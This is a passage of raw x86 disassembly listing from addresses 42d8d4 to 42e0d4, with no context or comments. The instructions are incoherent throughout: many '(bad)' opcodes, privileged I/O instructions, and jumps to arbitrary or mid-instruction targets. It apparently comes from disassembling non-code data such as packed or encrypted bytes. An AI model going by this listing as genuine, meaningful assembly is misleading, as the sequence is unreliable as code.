  42d8d4:	fcomi  st,st(4)
  42d8d6:	shl    bh,1
  42d8d8:	cli    
  42d8d9:	iret   
  42d8da:	shl    ecx,cl
  42d8dc:	jmp    0xf9b5:0xf4f0e9db
  42d8e3:	xlat   BYTE PTR ds:[ebx]
  42d8e4:	lds    eax,FWORD PTR [ebx]
  42d8e6:	jmp    0x42d8b2
  42d8e8:	or     ebp,ebx
  42d8ea:	cli    
  42d8eb:	add    esp,ecx
  42d8ed:	fucomp st(4)
  42d8ef:	retf   0xecb2
  42d8f2:	xlat   BYTE PTR ds:[ebx]
  42d8f3:	(bad)
  42d8f6:	loopne 0x42d8f3
  42d8f8:	lock (bad) 
  42d8fa:	fcmovnbe st,st(3)
  42d8fc:	repnz fndisi(8087 only) 
  42d8ff:	fnstsw ax
  42d901:	ret    0xe5c1
  42d904:	pop    es
  42d905:	(bad)  
  42d906:	sti    
  42d907:	aam    0xdd
  42d909:	clc    
  42d90a:	in     eax,0xef
  42d90c:	fmul   QWORD PTR [ebx]
  42d90e:	out    0xe6,eax
  42d910:	out    0xed,eax
  42d912:	lock hlt 
  42d914:	mov    cl,0xca
  42d916:	fprem  
  42d918:	xlat   BYTE PTR ds:[ebx]
  42d919:	icebp  
  42d91a:	in     al,0xca
  42d91c:	jmp    0xbcd9:0xe7dfecbd
  42d923:	shr    esp,1
  42d925:	fcmovu st,st(4)
  42d927:	ffreep st(0)
  42d929:	cli    
  42d92a:	push   es
  42d92b:	retf   0x909
  42d92e:	(bad)  
  42d930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d931:	mov    edi,0xcbcbcebd
  42d936:	mul    edi
  42d938:	lock out dx,al
  42d93a:	fdivr  DWORD PTR [ecx+0x1ddf0eb]
  42d940:	iret   
  42d941:	fsubrp st(5),st
  42d943:	ret    
  42d944:	stc    
  42d945:	sti    
  42d946:	ret    0xe201
  42d949:	or     eax,DWORD PTR [edi]
  42d94b:	fmul   QWORD PTR [ebx]
  42d94d:	jmp    0x42d954
  42d94f:	test   eax,0xc5ebc0d3
  42d954:	rol    edi,0xac
  42d957:	mov    al,0xc7
  42d959:	out    dx,al
  42d95a:	int3   
  42d95b:	cmc    
  42d95c:	repnz leave 
  42d95e:	mov    edi,0xccefcde2
  42d963:	add    bl,bl
  42d965:	hlt    
  42d966:	push   es
  42d967:	lock cld 
  42d969:	sti    
  42d96a:	shr    dl,0x6
  42d96d:	jmp    0x42d96b
  42d96f:	jmp    0x42d933
  42d971:	test   eax,0xe7d3cec4
  42d976:	fcmove st,st(7)
  42d978:	icebp  
  42d979:	mov    cl,0xba
  42d97b:	mov    ebp,0xd3e2d5d0
  42d980:	fadd   QWORD PTR [ecx]
  42d982:	mov    ecx,0x2d8d5eb
  42d988:	in     al,0xe0
  42d98a:	(bad)
  42d98d:	cld    
  42d98e:	in     eax,0xab
  42d990:	not    ecx
  42d992:	int    0xc8
  42d994:	in     al,0xca
  42d996:	in     eax,dx
  42d997:	repz repnz xlat BYTE PTR ds:[ebx]
  42d99a:	jmp    0xf41acd9a
  42d99f:	shl    dh,1
  42d9a1:	shl    cl,cl
  42d9a3:	add    eax,0xfec7c3d2
  42d9a8:	or     ah,dl
  42d9aa:	enter  0xc5ca,0xe
  42d9ae:	leave  
  42d9af:	ret    0xe8a6
  42d9b2:	ror    eax,0xf4
  42d9b5:	hlt    
  42d9b6:	ror    eax,1
  42d9b8:	leave  
  42d9b9:	sti    
  42d9ba:	in     al,0xfe
  42d9bc:	idiv   DWORD PTR [eax-0x40f82102]
  42d9c2:	xlat   BYTE PTR ds:[ebx]
  42d9c3:	xlat   BYTE PTR ds:[ebx]
  42d9c4:	(bad)  
  42d9c5:	std    
  42d9c6:	out    0xda,al
  42d9c8:	(bad)  
  42d9c9:	inc    BYTE PTR [edx]
  42d9cb:	fild   WORD PTR [edi+edi*8]
  42d9ce:	in     al,0xa9
  42d9d0:	shl    al,0xf2
  42d9d3:	retf   
  42d9d4:	mov    ah,0xe0
  42d9d6:	(bad)  
  42d9d7:	mov    ebx,0xd7e8e8cf
  42d9dc:	shr    esp,1
  42d9de:	leave  
  42d9df:	mov    ebx,0xbfdfb5fa
  42d9e4:	(bad)
  42d9e7:	icebp  
  42d9e8:	add    ecx,ebx
  42d9ea:	jmp    0x42d9d6
  42d9ec:	jmp    0xa4e0:0xe3c3e807
  42d9f3:	xlat   BYTE PTR ds:[ebx]
  42d9f4:	rcl    esi,1
  42d9f6:	mov    ch,0xc7
  42d9f8:	jmp    0xd81b9fdb
  42d9fd:	in     eax,dx
  42d9fe:	mov    esi,0xd7e3c3c8
  42da03:	add    eax,0xdccaf000
  42da08:	leave  
  42da09:	mov    ebp,0xc8ceddfb
  42da0e:	(bad)  
  42da10:	out    dx,eax
  42da11:	lods   eax,DWORD PTR ds:[esi]
  42da12:	(bad)  
  42da14:	mov    bh,0xe8
  42da16:	mov    dl,0xc9
  42da18:	clc    
  42da19:	mov    ch,0xb6
  42da1b:	repz mov eax,0xbfbaf8dd
  42da21:	aam    0xf4
  42da23:	loop   0x42da1a
  42da25:	jecxz  0x42da1d
  42da27:	fadd   QWORD PTR [ebx]
  42da29:	aam    0xea
  42da2b:	fisttp DWORD PTR [edi]
  42da2d:	iret   
  42da2e:	fadd   st,st(2)
  42da30:	int    0xae
  42da32:	fsubr  st(6),st
  42da34:	int    0xca
  42da36:	fld    st(4)
  42da38:	not    dh
  42da3a:	into   
  42da3b:	mov    bh,0xf5
  42da3d:	mov    esi,0xe2d5edf9
  42da42:	add    BYTE PTR [edx+eiz*8],al
  42da45:	fucom  st(2)
  42da47:	ret    0xd9f0
  42da4a:	jecxz  0x42da21
  42da4c:	ret    0xce8
  42da4f:	fnstcw WORD PTR [edi-0x1b38140a]
  42da55:	rol    esp,0xb6
  42da58:	leave  
  42da59:	in     eax,dx
  42da5a:	jmp    0x42da16
  42da5c:	mov    ecx,0xf2d3d3d4
  42da61:	(bad)  
  42da62:	stc    
  42da63:	cli    
  42da64:	add    bh,al
  42da66:	shl    dl,1
  42da68:	jmp    0x42da40
  42da6a:	jecxz  0x42da66
  42da6c:	int    0xde
  42da6e:	or     bh,ch
  42da70:	shl    esi,1
  42da72:	fucomp st(2)
  42da74:	loope  0x42da5d
  42da76:	rcl    esi,cl
  42da78:	retf   0xc6c9
  42da7b:	(bad)  
  42da7d:	fstp   TBYTE PTR [edx-0x3142ff04]
  42da83:	xlat   BYTE PTR ds:[ebx]
  42da84:	in     al,0xe3
  42da86:	(bad)  
  42da88:	(bad)  
  42da89:	mov    ebp,0xf2daeb0f
  42da8e:	add    al,0xef
  42da90:	scas   al,BYTE PTR es:[edi]
  42da91:	jecxz  0x42da51
  42da93:	iret   
  42da94:	mov    dh,0xb4
  42da96:	fldl2e 
  42da98:	cli    
  42da99:	jmp    0x42da8e
  42da9b:	in     eax,0xe3
  42da9d:	repnz rcr cl,cl
  42daa0:	fdivr  st,st(4)
  42daa2:	faddp  st(2),st
  42daa4:	mov    BYTE PTR [edx+eax*8],0x3
  42daa8:	in     eax,0xfd
  42daaa:	call   0xe22e9fb2
  42daaf:	out    dx,al
  42dab0:	lods   al,BYTE PTR ds:[esi]
  42dab1:	mul    dh
  42dab3:	loopne 0x42da62
  42dab5:	into   
  42dab6:	(bad)  
  42dab7:	fcmovu st,st(2)
  42dab9:	out    dx,eax
  42daba:	mov    ecx,0xe8cd03cb
  42dabf:	int3   
  42dac0:	add    BYTE PTR [ecx],al
  42dac2:	pop    es
  42dac3:	faddp  st(2),st
  42dac5:	or     edx,esi
  42dac7:	rol    bh,0xcb
  42daca:	aam    0xd5
  42dacc:	or     esi,edx
  42dace:	or     DWORD PTR [edx-0x110a5628],esi
  42dad4:	call   0xda04a2ae
  42dad9:	lock les edi,FWORD PTR [ebx-0xc070d38]
  42dae0:	mov    dh,0xff
  42dae2:	sar    DWORD PTR [ebp-0x28061d3d],0xe7
  42dae9:	aad    0xe4
  42daeb:	loopne 0x42dabc
  42daed:	or     ecx,ecx
  42daef:	retf   
  42daf0:	lods   al,BYTE PTR ds:[esi]
  42daf1:	fild   QWORD PTR [esi-0x154f4c29]
  42daf7:	loope  0x42daea
  42daf9:	lock iret 
  42dafb:	std    
  42dafc:	enter  0xefba,0xec
  42db00:	mov    ebp,0xd1e4d5cc
  42db05:	(bad)
  42db08:	fdivp  st(4),st
  42db0a:	loop   0x42db0f
  42db0c:	out    dx,eax
  42db0d:	sti    
  42db0e:	(bad)  
  42db10:	imul   esp
  42db12:	shl    BYTE PTR [ebx-0x1e133e1b],0xdf
  42db19:	(bad)  
  42db1a:	div    BYTE PTR [edi+0xeddfd3]
  42db20:	loope  0x42db00
  42db22:	loope  0x42db20
  42db24:	mov    esi,0xc1c1c6b9
  42db29:	fsubr  st,st(5)
  42db2b:	jecxz  0x42db34
  42db2d:	retf   0xdefe
  42db30:	shl    DWORD PTR [eax-0x114a1653],1
  42db36:	(bad)  
  42db37:	retf   0xcbdf
  42db3a:	mov    eax,0xeed6f0b9
  42db3f:	out    dx,eax
  42db40:	in     eax,dx
  42db41:	add    edi,edi
  42db43:	(bad)  
  42db45:	std    
  42db46:	loop   0x42db31
  42db48:	leave  
  42db49:	or     ah,bl
  42db4b:	(bad)  
  42db4c:	loop   0x42db41
  42db4e:	ror    bh,cl
  42db50:	fmul   st(0),st
  42db52:	jmp    0xd30bd30c
  42db57:	repz vpsubq xmm5,xmm1,xmm0
  42db5c:	int    0xfa
  42db5e:	shr    bh,cl
  42db60:	add    ebx,ebx
  42db62:	int3   
  42db63:	bnd repz ret 
  42db66:	fadd   st(1),st
  42db68:	cli    
  42db69:	aad    0xdb
  42db6b:	add    al,BYTE PTR [esi]
  42db6d:	loope  0x42db68
  42db6f:	into   
  42db70:	loope  0x42db23
  42db72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db73:	int3   
  42db74:	into   
  42db75:	enter  0xdbf9,0xd3
  42db79:	jmp    0xfd0d9346
  42db7e:	int    0xff
  42db80:	add    bl,ah
  42db82:	rcl    cl,1
  42db84:	(bad)  
  42db86:	icebp  
  42db87:	or     ebx,esp
  42db89:	loopne 0x42db94
  42db8b:	add    eax,0xe309fbfd
  42db90:	enter  0xb1c5,0xf5
  42db94:	enter  0xe7c5,0xb5
  42db98:	lock lods eax,DWORD PTR ds:[esi]
  42db9a:	mov    edx,0xdde9ead3
  42db9f:	lock (bad) 
  42dba2:	cli    
  42dba3:	push   es
  42dba4:	pop    es
  42dba5:	fcmovnbe st,st(0)
  42dba7:	faddp  st(6),st
  42dba9:	jmp    0xe44ba1a7
  42dbae:	iret   
  42dbaf:	test   eax,0xbca8ece6
  42dbb4:	out    0xad,eax
  42dbb6:	(bad)  
  42dbb7:	in     al,dx
  42dbb8:	mov    ebx,0xdcbddeb0
  42dbbd:	repz mov al,0xe2
  42dbc0:	mov    esp,0xffd2e2d5
  42dbc5:	std    
  42dbc6:	loop   0x42dba9
  42dbc8:	fild   WORD PTR [edi]
  42dbca:	call   0x61be9c3
  42dbcf:	repnz mov bl,0xe5
  42dbd2:	in     eax,dx
  42dbd3:	shr    cl,1
  42dbd5:	mov    ebx,0xf7efd3c1
  42dbda:	div    ebx
  42dbdc:	shl    DWORD PTR [ecx-0x905ff2c],1
  42dbe2:	clc    
  42dbe3:	in     eax,0xfc
  42dbe5:	fdiv   st(1),st
  42dbe7:	retf   
  42dbe8:	add    ecx,edi
  42dbea:	or     eax,0xebe4e2ef
  42dbef:	loop   0x42dbdb
  42dbf1:	test   al,0xf0
  42dbf3:	ret    
  42dbf4:	mov    esp,0xf2ccd6da
  42dbf9:	sar    bl,cl
  42dbfb:	mov    ah,0xee
  42dbfd:	repz mov edi,0xd8d5c1c1
  42dc03:	(bad)  
  42dc05:	push   es
  42dc06:	ret    0xffdf
  42dc09:	out    0xe1,eax
  42dc0b:	(bad)  
  42dc0c:	in     al,0xe6
  42dc0e:	in     eax,dx
  42dc0f:	fsubr  QWORD PTR [edx-0xf2d3424]
  42dc15:	lods   al,BYTE PTR ds:[esi]
  42dc16:	rcl    edi,1
  42dc18:	retf   0xddd4
  42dc1b:	rcr    ebx,cl
  42dc1d:	iret   
  42dc1e:	repnz add BYTE PTR [eax+eax*8+0xd7d305],bh
  42dc26:	icebp  
  42dc27:	lds    ecx,FWORD PTR [ecx]
  42dc29:	rcr    esp,0xee
  42dc2c:	in     al,0xd8
  42dc2e:	leave  
  42dc2f:	mov    bl,0xdd
  42dc31:	loop   0x42dbe6
  42dc33:	retf   
  42dc34:	in     eax,0xb6
  42dc36:	(bad)  
  42dc37:	mul    ebp
  42dc39:	out    dx,al
  42dc3a:	mov    ch,0xd8
  42dc3c:	iret   
  42dc3d:	out    dx,eax
  42dc3e:	shr    ebp,1
  42dc40:	aam    0xe2
  42dc42:	ret    
  42dc43:	mov    esp,0xc2e2dfff
  42dc48:	jmp    0x836de16
  42dc4d:	cli    
  42dc4e:	stc    
  42dc4f:	(bad)
  42dc52:	leave  
  42dc53:	not    cl
  42dc55:	out    dx,eax
  42dc56:	sar    edx,1
  42dc58:	iret   
  42dc59:	mov    bh,0xd4
  42dc5b:	(bad)  
  42dc5c:	xlat   BYTE PTR ds:[ebx]
  42dc5d:	rol    bl,cl
  42dc5f:	cli    
  42dc60:	mov    esi,0xe7dfc1de
  42dc65:	shl    ebp,cl
  42dc67:	shl    esp,0xd4
  42dc6a:	or     ebx,ebp
  42dc6c:	jmp    0xb2e5:0xaaeeead3
  42dc73:	(bad)  
  42dc74:	ror    ah,1
  42dc76:	mov    dl,0xc7
  42dc78:	div    ch
  42dc7a:	hlt    
  42dc7b:	imul   al
  42dc7d:	(bad)  
  42dc7e:	mov    edx,0xbfe7d1ce
  42dc83:	add    BYTE PTR [esi],al
  42dc85:	hlt    
  42dc86:	or     esp,edx
  42dc88:	add    bh,al
  42dc8a:	in     eax,dx
  42dc8b:	pop    es
  42dc8c:	add    eax,0xcbccd9d3
  42dc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc92:	mov    esp,0xfbfab5c8
  42dc97:	out    dx,al
  42dc98:	fcomi  st,st(3)
  42dc9a:	jmp    0xea1ac56f
  42dc9f:	lock neg dl
  42dca2:	int    0x2
  42dca4:	fcomi  st,st(7)
  42dca6:	(bad)  
  42dca7:	(bad)  
  42dca8:	(bad)  
  42dca9:	fadd   QWORD PTR [ebx]
  42dcab:	retf   0xfd07
  42dcae:	out    0xb2,al
  42dcb0:	mov    ebp,0xe2edecf1
  42dcb5:	rcl    ecx,cl
  42dcb7:	test   ah,0xd5
  42dcba:	shl    ch,cl
  42dcbc:	retf   0xedd7
  42dcbf:	call   0xe640c2c4
  42dcc4:	add    dl,al
  42dcc6:	repnz or eax,edx
  42dcc9:	clc    
  42dcca:	leave  
  42dccb:	jecxz  0x42dcda
  42dccd:	or     DWORD PTR [edi],eax
  42dccf:	iret   
  42dcd0:	scas   eax,DWORD PTR es:[edi]
  42dcd1:	shl    bh,cl
  42dcd3:	(bad)  
  42dcd4:	jmp    0x42dcc2
  42dcd6:	rcl    eax,1
  42dcd8:	out    0xb1,eax
  42dcda:	mov    dh,0xfd
  42dcdc:	mov    ah,0xea
  42dcde:	iret   
  42dcdf:	mov    ebx,0xc5e6fed6
  42dce4:	cli    
  42dce5:	shl    esp,cl
  42dce7:	cld    
  42dce8:	psubq  mm1,QWORD PTR [edi]
  42dceb:	or     bh,bl
  42dced:	or     al,0x4
  42dcef:	ror    bl,cl
  42dcf1:	loopne 0x42dcb3
  42dcf3:	leave  
  42dcf4:	int    0xe6
  42dcf6:	(bad)  
  42dcf7:	mov    ch,0xf2
  42dcf9:	iret   
  42dcfa:	mov    dh,0xbb
  42dcfc:	in     al,0xcf
  42dcfe:	in     al,dx
  42dcff:	cld    
  42dd00:	xlat   BYTE PTR ds:[ebx]
  42dd01:	test   DWORD PTR [esi],0xe1fbf5f1
  42dd07:	add    al,0xff
  42dd09:	(bad)  
  42dd0a:	jmp    0xedcc:0xf9e609e9
  42dd11:	lds    ebp,FWORD PTR [eax-0x493b2c11]
  42dd17:	shl    ebp,0xf7
  42dd1a:	(bad)  
  42dd1b:	cli    
  42dd1c:	in     al,0xe3
  42dd1e:	out    dx,eax
  42dd1f:	stc    
  42dd20:	fidivr DWORD PTR [ecx-0x1933fe1a]
  42dd26:	aad    0xbf
  42dd28:	pop    es
  42dd29:	(bad)  
  42dd2a:	push   es
  42dd2b:	ud2    
  42dd2d:	in     eax,0x7
  42dd2f:	mov    eax,0xe1e4bfca
  42dd34:	loope  0x42dd2a
  42dd36:	loop   0x42dd07
  42dd38:	mov    eax,0xeccad0c6
  42dd3d:	xlat   BYTE PTR ds:[ebx]
  42dd3e:	jecxz  0x42dd21
  42dd40:	sar    BYTE PTR [edi-0x201fb19],1
  42dd46:	loopne 0x42dd2b
  42dd48:	add    eax,0xe4f90df7
  42dd4d:	in     al,0xf3
  42dd4f:	ret    
  42dd50:	jmp    0xcf318228
  42dd55:	repz mov ebx,0xd9c7aeb4
  42dd5b:	(bad)  
  42dd5c:	mov    ebp,0xb603d6d6
  42dd61:	div    ebx
  42dd63:	repnz stc 
  42dd65:	(bad)  
  42dd66:	jmp    0xe8ed:0xcbf5caf7
  42dd6d:	add    cl,bl
  42dd6f:	rcr    dh,0xcc
  42dd72:	fisubr WORD PTR [ebx-0xc280819]
  42dd78:	int    0xfb
  42dd7a:	out    dx,al
  42dd7b:	fnstcw WORD PTR [ebx-0x1c1c1d16]
  42dd81:	iret   
  42dd82:	xlat   BYTE PTR ds:[ebx]
  42dd83:	rcr    esi,cl
  42dd85:	rcr    bh,1
  42dd87:	pop    es
  42dd88:	sar    al,0xdd
  42dd8b:	loope  0x42dd5a
  42dd8d:	retf   0xaedd
  42dd90:	enter  0xbed1,0xb3
  42dd94:	jmp    0x42dd5a
  42dd96:	mov    al,0xaf
  42dd98:	leave  
  42dd99:	jmp    0xe0ef:0xfcfee8bb
  42dda0:	into   
  42dda1:	fild   DWORD PTR ds:0xcaf3f5da
  42dda7:	loopne 0x42dda9
  42dda9:	fld1   
  42ddab:	loop   0x42ddb1
  42ddad:	call   0xb401a093
  42ddb2:	mov    esi,0xe4d1dcb6
  42ddb7:	loope  0x42ddb1
  42ddb9:	out    dx,eax
  42ddba:	repz xlat BYTE PTR ds:[ebx]
  42ddbc:	jmp    0x42ddb3
  42ddbe:	repnz out dx,al
  42ddc0:	enter  0x3ce,0xdb
  42ddc4:	loopne 0x42ddb1
  42ddc6:	or     edi,DWORD PTR [edi-0x15293422]
  42ddcc:	clc    
  42ddcd:	(bad)  
  42ddcf:	out    0xe7,al
  42ddd1:	out    0xe6,eax
  42ddd3:	out    dx,al
  42ddd4:	fadd   st(4),st
  42ddd6:	jmp    0xbf318fbf
  42dddb:	(bad)
  42ddde:	sar    DWORD PTR [eax+esi*8-0x70b1808],cl
  42dde5:	test   bh,0xe6
  42dde8:	fadd   QWORD PTR [edx*8-0x2c1b0516]
  42ddef:	mov    esp,0xd2aef6ae
  42ddf4:	repz mov cl,0xec
  42ddf7:	ror    esp,cl
  42ddf9:	sti    
  42ddfa:	jmp    0x42ddf2
  42ddfc:	int3   
  42ddfd:	mov    cl,0xc8
  42ddff:	mov    edx,0xf6df01d9
  42de04:	aam    0xc0
  42de06:	in     al,0xd8
  42de08:	retf   0xf9ee
  42de0b:	ret    
  42de0c:	cld    
  42de0d:	in     al,0x9
  42de0f:	fstp   st(4)
  42de11:	loopne 0x42ddd8
  42de13:	mov    bh,0xe2
  42de15:	int    0xe7
  42de17:	mov    bl,0xda
  42de19:	in     al,dx
  42de1a:	fucomip st,st(3)
  42de1c:	int    0xd1
  42de1e:	icebp  
  42de1f:	mov    esp,0xc206bddd
  42de24:	std    
  42de25:	add    esp,edi
  42de27:	neg    dh
  42de29:	push   es
  42de2a:	jecxz  0x42de32
  42de2c:	or     edi,edx
  42de2e:	into   
  42de2f:	in     eax,0xd0
  42de31:	loope  0x42ddf5
  42de33:	repz mov bh,0xb2
  42de36:	repz shl al,1
  42de39:	call   esp
  42de3b:	fcmovbe st,st(7)
  42de3d:	into   
  42de3e:	jecxz  0x42de0c
  42de40:	aad    0xc2
  42de42:	mov    esp,0xbf8dcbf
  42de47:	jmp    0x42de20
  42de49:	dec    ebx
  42de4b:	leave  
  42de4c:	in     al,0xfa
  42de4e:	add    dh,BYTE PTR [edx-0x5332423a]
  42de54:	aam    0xd7
  42de56:	repnz cli 
  42de58:	retf   0xb9d4
  42de5b:	out    dx,al
  42de5c:	push   DWORD PTR [ebp-0x2b1d4444]
  42de62:	mov    esi,0xc1dd01fc
  42de67:	aam    0xe5
  42de69:	sti    
  42de6a:	or     esi,ebx
  42de6c:	in     al,dx
  42de6d:	add    al,0xe6
  42de6f:	jmp    0xd2288d26
  42de74:	enter  0xf0c2,0xe7
  42de78:	jmp    0xdbf9:0xb8b8acb1
  42de7f:	div    bl
  42de81:	ffree  st(2)
  42de83:	loope  0x42de56
  42de85:	(bad)  
  42de86:	jmp    0xdf47be60
  42de8b:	loope  0x42de81
  42de8d:	loope  0x42de82
  42de8f:	mov    edi,0xf2b7d0e5
  42de94:	ror    esp,0xd4
  42de97:	stc    
  42de98:	iret   
  42de99:	iret   
  42de9a:	xlat   BYTE PTR ds:[ebx]
  42de9b:	mov    bh,0xf0
  42de9d:	add    dl,ch
  42de9f:	enter  0xddd0,0xd9
  42dea3:	(bad)  
  42dea4:	aam    0xf3
  42dea6:	fdivr  st(0),st
  42dea8:	jmp    0xe30cc0b2
  42dead:	out    dx,al
  42deae:	(bad)  
  42deaf:	scas   al,BYTE PTR es:[edi]
  42deb0:	out    0xe2,al
  42deb2:	shr    BYTE PTR [ebx-0x323f3e3b],0xca
  42deb9:	cli    
  42deba:	(bad)  
  42debc:	repnz idiv esi
  42debf:	mov    esi,0xbbd1fbcd
  42dec4:	aad    0xc7
  42dec6:	sti    
  42dec7:	fcmovnu st,st(2)
  42dec9:	mov    ebp,0xdcc5e500
  42dece:	fucomip st,st(1)
  42ded0:	enter  0xd6e3,0xe4
  42ded4:	out    0xe9,eax
  42ded6:	in     eax,dx
  42ded7:	in     eax,dx
  42ded8:	(bad)  
  42ded9:	(bad)  
  42dedb:	mov    eax,0xdeccbdfe
  42dee0:	in     al,dx
  42dee1:	ret    0x5b4
  42dee4:	(bad)  
  42dee5:	or     eax,ebx
  42dee7:	(bad)  
  42dee9:	stc    
  42deea:	in     al,0xee
  42deec:	vaddsubps xmm6,xmm5,XMMWORD PTR [edx-0x1c163f4d]
  42def5:	repz retf 
  42def7:	ror    bh,cl
  42def9:	inc    ebp
  42defb:	out    dx,al
  42defc:	hlt    
  42defd:	cmc    
  42defe:	add    edx,edi
  42df00:	out    dx,eax
  42df01:	loopne 0x42dee3
  42df03:	(bad)  
  42df05:	(bad)  
  42df06:	clc    
  42df07:	call   0xe32be0a
  42df0c:	or     dl,cl
  42df0e:	or     eax,0xa4c2c9ad
  42df13:	(bad)
  42df16:	jmp    0xceb7:0xc5e7e4ce
  42df1d:	shl    ecx,1
  42df1f:	repz fadd st(3),st
  42df22:	fsub   st,st(0)
  42df24:	pop    es
  42df25:	mov    ebp,0xe0dee4e2
  42df2a:	push   esp
  42df2c:	hlt    
  42df2d:	(bad)  
  42df2e:	fisubr WORD PTR [eax-0x110a3d56]
  42df34:	loop   0x42df07
  42df36:	ror    edi,1
  42df38:	fdiv   st,st(6)
  42df3a:	in     al,0xbb
  42df3c:	clc    
  42df3d:	sti    
  42df3e:	hlt    
  42df3f:	mov    edx,0xfae7ccf0
  42df44:	ret    
  42df45:	out    0xea,al
  42df47:	add    ecx,edx
  42df49:	enter  0x9d4,0x4
  42df4d:	in     eax,0xdd
  42df4f:	fidivr WORD PTR [esp+ebx*8-0x2a3c5043]
  42df56:	jmp    0x42df22
  42df58:	xlat   BYTE PTR ds:[ebx]
  42df59:	retf   
  42df5a:	iret   
  42df5b:	(bad)
  42df5e:	sar    DWORD PTR [ebp-0x3c183007],cl
  42df64:	(bad)  
  42df65:	cli    
  42df66:	ret    
  42df67:	retf   
  42df68:	out    dx,eax
  42df69:	iret   
  42df6a:	fimul  DWORD PTR [esi+eax*1]
  42df6d:	out    dx,eax
  42df6e:	add    esp,ebx
  42df70:	stos   BYTE PTR es:[edi],al
  42df71:	neg    ah
  42df73:	int    0xec
  42df75:	cli    
  42df76:	jmp    0xca28cb71
  42df7b:	shl    esp,1
  42df7d:	call   0xdb23c377
  42df82:	into   
  42df83:	aad    0xe7
  42df85:	cli    
  42df86:	mov    esp,0xdffe0ae5
  42df8b:	(bad)  
  42df8d:	fiadd  WORD PTR [ebx]
  42df8f:	in     eax,0xbf
  42df91:	int3   
  42df92:	mov    cl,0xd3
  42df94:	mov    dh,0xac
  42df96:	enter  0xc0f7,0xf9
  42df9a:	jmp    0xb121ba92
  42df9f:	fadd   st,st(0)
  42dfa1:	div    ah
  42dfa3:	cli    
  42dfa4:	hlt    
  42dfa5:	(bad)  
  42dfa7:	test   ecx,0x7dae6f4
  42dfad:	sti    
  42dfae:	or     al,0xae
  42dfb0:	rcl    bh,0xcb
  42dfb3:	scas   eax,DWORD PTR es:[edi]
  42dfb4:	aad    0xc8
  42dfb6:	loope  0x42df6b
  42dfb8:	in     eax,0xf7
  42dfba:	enter  0xbbde,0xf8
  42dfbe:	stc    
  42dfbf:	fstp   st(5)
  42dfc1:	ret    
  42dfc2:	std    
  42dfc3:	in     eax,dx
  42dfc4:	lock push esp
  42dfc7:	std    
  42dfc8:	out    dx,eax
  42dfc9:	or     esp,ecx
  42dfcb:	or     ah,bh
  42dfcd:	repnz in eax,0xe9
  42dfd0:	fucomip st,st(1)
  42dfd2:	retf   
  42dfd3:	hlt    
  42dfd4:	int3   
  42dfd5:	mov    dl,0xb5
  42dfd7:	cli    
  42dfd8:	(bad)  
  42dfd9:	stc    
  42dfda:	retf   0xd9f2
  42dfdd:	cli    
  42dfde:	mov    ah,0xf1
  42dfe0:	into   
  42dfe1:	hlt    
  42dfe2:	push   es
  42dfe3:	mov    ebp,0xd9fcc3fa
  42dfe8:	add    al,0xea
  42dfea:	add    edi,esp
  42dfec:	jmp    0x42dffb
  42dfee:	out    dx,eax
  42dfef:	in     eax,0xbc
  42dff1:	mov    al,0xc7
  42dff3:	fucom  st(7)
  42dff5:	loop   0x42dfc5
  42dff7:	mov    cl,0xf6
  42dff9:	mov    edi,0xdbd6ebf8
  42dffe:	call   0xdf11b2bb
  42e003:	lock add eax,DWORD PTR [edi+esi*8]
  42e007:	(bad)
  42e00a:	add    eax,0xf312d8e1
  42e00f:	fild   QWORD PTR [edi-0x1d1f533c]
  42e015:	mov    bh,0xc6
  42e017:	(bad)  
  42e018:	in     eax,dx
  42e019:	clc    
  42e01a:	icebp  
  42e01b:	rcl    edx,cl
  42e01d:	(bad)  
  42e01f:	repz add DWORD PTR [eax],eax
  42e022:	mov    esi,0xfbd5c4df
  42e027:	(bad)  
  42e028:	jmp    0xfc12:0xddcddca
  42e02f:	retf   
  42e030:	out    0xc0,al
  42e032:	call   0xe82aa400
  42e037:	icebp  
  42e038:	hlt    
  42e039:	(bad)  
  42e03a:	iret   
  42e03b:	cli    
  42e03c:	shl    dh,cl
  42e03e:	cld    
  42e03f:	ret    
  42e040:	sar    ah,1
  42e042:	loopne 0x42e04b
  42e044:	add    edx,ebp
  42e046:	fcmovu st,st(6)
  42e048:	(bad)  
  42e049:	out    0xbc,al
  42e04b:	add    BYTE PTR [edi],al
  42e04d:	repz (bad) 
  42e04f:	stos   BYTE PTR es:[edi],al
  42e050:	repnz shl edi,0xca
  42e054:	in     eax,0xf2
  42e056:	loopne 0x42e00d
  42e058:	aam    0xd8
  42e05a:	stc    
  42e05b:	shl    esp,cl
  42e05d:	fsub   st(4),st
  42e05f:	cli    
  42e060:	mov    ecx,0xf5d8f8ef
  42e065:	mov    ebp,0xd9d5e2f6
  42e06a:	push   es
  42e06b:	out    0x8,al
  42e06d:	fmul   st(7),st
  42e06f:	mov    dl,0xae
  42e071:	in     eax,dx
  42e072:	(bad)
  42e075:	mov    ah,0xe4
  42e077:	int    0xb6
  42e079:	fcom   st(0)
  42e07b:	cli    
  42e07c:	(bad)  
  42e07e:	out    dx,eax
  42e07f:	sar    edx,0xfa
  42e082:	(bad)  
  42e084:	mov    esi,0x3d507c1
  42e089:	cmc    
  42e08a:	mov    esp,0xed1306fc
  42e08f:	(bad)
  42e092:	ffree  st(1)
  42e094:	ret    
  42e095:	shr    ecx,1
  42e097:	(bad)  
  42e098:	fdivr  st,st(2)
  42e09a:	retf   
  42e09b:	mov    ch,0xed
  42e09d:	(bad)  
  42e09e:	mov    ecx,0xc200ded5
  42e0a3:	stc    
  42e0a4:	ror    ebx,1
  42e0a6:	(bad)  
  42e0a7:	dec    BYTE PTR [edx]
  42e0a9:	out    dx,eax
  42e0aa:	or     BYTE PTR [eax],cl
  42e0ac:	cld    
  42e0ad:	fsubr  st(0),st
  42e0af:	mov    cl,0xd2
  42e0b1:	out    dx,eax
  42e0b2:	shr    BYTE PTR [ebp-0x9290b30],0xeb
  42e0b9:	faddp  st(5),st
  42e0bb:	cmc    
  42e0bc:	int    0xdf
  42e0be:	in     eax,dx
  42e0bf:	std    
  42e0c0:	std    
  42e0c1:	stc    
  42e0c2:	cld    
  42e0c3:	ret    
  42e0c4:	cmc    
  42e0c5:	cmc    
  42e0c6:	sar    bl,cl
  42e0c8:	add    esi,esp
  42e0ca:	push   es
  42e0cb:	loopne 0x42e0b8
  42e0cd:	ffree  st(0)
  42e0cf:	int    0xeb
  42e0d1:	into   
  42e0d2:	lods   eax,DWORD PTR ds:[esi]
  42e0d3:	cmc    
  42e0d4:	xlat   BYTE PTR ds:[ebx]
